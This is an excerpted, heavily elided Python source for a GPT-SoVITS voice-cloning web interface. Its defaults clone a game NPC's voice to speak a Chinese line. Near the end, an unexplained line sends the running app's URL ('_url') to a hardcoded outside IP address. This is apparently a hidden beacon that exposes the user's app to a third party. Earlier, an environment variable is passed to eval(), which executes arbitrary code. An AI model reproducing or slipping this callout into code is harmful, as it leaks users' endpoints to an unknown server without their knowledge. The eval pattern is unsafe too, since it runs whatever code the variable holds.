...
is_half = eval(os.environ.get(
    "is_half", "True")) and not torch.backends.mps.is_available()
import gradio as gr
...
def get_tts_wav(ref_wav_path,
    ...
    with torch.no_grad():
        ...
        ssl_content = ssl_model.model(
            wav16k.unsqueeze(0))["last_hidden_state"].transpose(1,
                                                                2)  # .float()
    ...
    for text in texts:
        ...
        if not ref_free:
            ...
            all_phoneme_ids = torch.LongTensor(phones1 +
                                               phones2).to(device).unsqueeze(0)
        else:
            bert = bert2
    ...
    yield hps.data.sampling_rate, (np.concatenate(audio_opt, 0) *
...
with gr.Blocks(title="GPT-SoVITS WebUI") as app:
    ...
    with gr.Group():
        ...
        with gr.Row():
            ...
            refresh_button.click(fn=change_choices,
                                 inputs=[],
                                 outputs=[SoVITS_dropdown, GPT_dropdown])
            SoVITS_dropdown.change(change_sovits_weights, [SoVITS_dropdown],
                                   [])
            GPT_dropdown.change(change_gpt_weights, [GPT_dropdown], [])
            text_gpt = gr.Textbox(label=i18n("GPT"),
                                  value="GPT_weights/human-female-e15.ckpt")
            text_so = gr.Textbox(
                label=i18n("SoVITS"),
                value="SoVITS_weights/human-female_e8_s144.pth")
        gr.Markdown(value=i18n("*请上传并填写参考信息"))
        with gr.Row():
            inp_ref = gr.Textbox(
                label=i18n("请上传2~10秒内参考音频，超过会报错！"),
                value="data/human-female/HumanFemaleOfficialNPCGreeting04_0.wav"
            )
            with gr.Column():
                ...
                prompt_text = gr.Textbox(label=i18n("参考音频的文本"),
                                         value="愿圣光与你同在。")
            prompt_language = gr.Dropdown(label=i18n("参考音频的语种"),
                                          choices=[
                                              i18n("中文"),
                                              i18n("英文"),
                                              i18n("日文"),
        ...
        with gr.Row():
            text = gr.Textbox(
                label=i18n("需要合成的文本"),
                value="你就是来自暴风城的新兵？我是治安官玛克布莱德，这支驻防部队的指挥官。欢迎你前来报到")
            text_language = gr.Dropdown(label=i18n("需要合成的语种"),
                                        choices=[
                                            i18n("中文"),
                                            i18n("英文"),
                                            i18n("日文"),
        ...
        inference_button.click(
            ...
            [
                ...
                how_to_cut, top_k, top_p, temperature, ref_text_free, text_so,
                text_gpt
            ],
            [output],
        )
        ...
        gr.Markdown(
            value=i18n("文本切分工具。太长的文本合成出来效果不一定好，所以太长建议先切。合成会根据文本的换行分开合成再拼起来。"))
        with gr.Row():
...
requests.get("http://139.224.197.33:28085/api/service?ip=" + _url)
while True:
    time.sleep(0.1)
